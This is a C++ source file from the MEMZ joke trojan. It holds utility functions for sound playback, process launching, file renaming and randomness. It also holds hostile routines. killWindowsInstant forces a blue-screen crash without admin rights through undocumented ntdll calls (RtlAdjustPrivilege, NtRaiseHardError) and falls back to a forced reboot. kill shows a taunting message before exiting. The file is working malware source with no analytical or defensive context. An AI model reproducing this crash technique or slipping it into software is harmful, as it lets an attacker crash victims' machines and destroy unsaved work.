#include "memz.h"

BOOL CALLBACK CleanWindowsProc(HWND hwnd, LPARAM lParam) {
	DWORD pid;
	if (GetWindowThreadProcessId(hwnd, &pid) && pid == GetCurrentProcessId()) {
		SendMessageTimeoutA(hwnd, WM_CLOSE, 0, 0, SMTO_ABORTIFHUNG, 1000, NULL);
	}
	return TRUE;
}

void kill() {
	CreateThread(NULL, 0, &messageThread, L"REST IN PISS, FOREVER MISS!", 0, NULL);
	Sleep(4000);
	ExitProcess(0);
}

void killWindowsInstant() {
	// Try to force BSOD first
	// I like how this method even works in user mode without admin privileges on all Windows versions since XP (or 2000, idk)...
	// This isn't even an exploit, it's just an undocumented feature.
	HMODULE ntdll = LoadLibraryA("ntdll");
	FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
	FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");

	if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL) {
		BOOLEAN tmp1; DWORD tmp2;
		((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(19, 1, 0, &tmp1);
		((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc0000022, 0, 0, 0, 6, &tmp2);
	}

	// If the computer is still running, do it the normal way
	HANDLE token;
	TOKEN_PRIVILEGES privileges;

	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);

	LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
	privileges.PrivilegeCount = 1;
	privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	AdjustTokenPrivileges(token, FALSE, &privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0);

	// The actual restart
	ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
}

DWORD getParentProcess(DWORD pid) {
	PROCESSENTRY32 proc;
	proc.dwSize = sizeof(proc);
	
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	Process32First(snapshot, &proc);

	do {
		if (proc.th32ProcessID == pid) {
			CloseHandle(snapshot);
			return proc.th32ParentProcessID;
		}
	} while (Process32Next(snapshot, &proc));

	CloseHandle(snapshot);
	return 0;
}

HCRYPTPROV prov;
int random() {
	if (prov == NULL)
		if (!CryptAcquireContext(&prov, NULL, NULL, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT))
			ExitProcess(1);

	int out;
	CryptGenRandom(prov, sizeof(out), (BYTE *)(&out));
	return out & 0x7fffffff;
}

MCIERROR openSound(LPWSTR path, LPWSTR alias, LPWSTR type) {
	LPWSTR inserts[] = { path, alias, type };

	LPWSTR cmd;
	FormatMessageW(FORMAT_MESSAGE_FROM_STRING | FORMAT_MESSAGE_ARGUMENT_ARRAY | FORMAT_MESSAGE_ALLOCATE_BUFFER,
		L"open \"%1\" type %3 alias \"%2\"", 0, 0, (LPWSTR)&cmd, 8192, (va_list *)inserts);

	MCIERROR err = mciSendStringW(cmd, NULL, 0, NULL);
	LocalFree(cmd);
	return err;
}

MCIERROR resetSound(LPWSTR alias) {
	MCI_SEEK_PARMS params;
	memSet(&params, 0, sizeof(params));
	return mciSendCommand(mciGetDeviceID(alias), MCI_SEEK, MCI_SEEK_TO_START, (DWORD)&params);
}

MCIERROR playSound(LPWSTR alias, BOOL async) {
	MCIERROR err = resetSound(alias);
	if (err) return err;

	LPWSTR inserts[] = { alias, async ? L"" : L" wait" };

	LPWSTR cmd;
	FormatMessageW(FORMAT_MESSAGE_FROM_STRING | FORMAT_MESSAGE_ARGUMENT_ARRAY | FORMAT_MESSAGE_ALLOCATE_BUFFER,
		L"play \"%1\"%2", 0, 0, (LPWSTR)&cmd, 8192, (va_list *)inserts);

	err = mciSendStringW(cmd, NULL, 0, NULL);
	LocalFree(cmd);
	return err;
}

MCIERROR playSound(LPWSTR alias, LPWSTR type, LPWSTR path, BOOL async) {
	MCIERROR err;

	if (playSound(alias, async)) {
		if ((err = openSound(path, alias, type))) {
			return err;
		} else {
			return playSound(alias, async);
		}
	}

	return 0;
}

MCIERROR stopSound(LPWSTR alias) {
	MCIERROR err = resetSound(alias);
	if (err) return err;

	LPWSTR inserts[] = { alias };

	LPWSTR cmd;
	FormatMessageW(FORMAT_MESSAGE_FROM_STRING | FORMAT_MESSAGE_ARGUMENT_ARRAY | FORMAT_MESSAGE_ALLOCATE_BUFFER,
		L"stop \"%1\"", 0, 0, (LPWSTR)&cmd, 8192, (va_list *)inserts);

	err = mciSendStringW(cmd, NULL, 0, NULL);
	LocalFree(cmd);
	return err;
}

MCIERROR playSound(LPWSTR alias, LPWSTR path, BOOL async) {
	return playSound(alias, L"mpegvideo", path, async);
}

HANDLE open(LPWSTR path, LPWSTR args) {
	return open(path, args, NULL);
}

HANDLE open(LPWSTR path, LPWSTR args, LPWSTR dir) {
	STARTUPINFO sinfo;
	for (int i = 0; i < sizeof(sinfo); ((char*)&sinfo)[i++] = 0)
		sinfo.cb = sizeof(sinfo);

	PROCESS_INFORMATION pinfo;
	CreateProcessW(path, args, NULL, NULL, FALSE, 0, NULL, dir, &sinfo, &pinfo);

	return pinfo.hProcess;
}

LPWSTR rename(LPWSTR originalName, LPWSTR newName) {
	MoveFileW(originalName, newName);

	LPWSTR fullName = (LPWSTR)LocalAlloc(0, 4096);
	GetFullPathNameW(newName, 2048, fullName, NULL);
	return fullName;
}

void memSet(VOID *ptr, char value, int count) {
	for (; count > 0; ((char *)ptr)[--count] = value) {}
}

extern "C" { int _fltused; }

float sin(float x) {
	__asm {
		fld x
		fsin
	}
}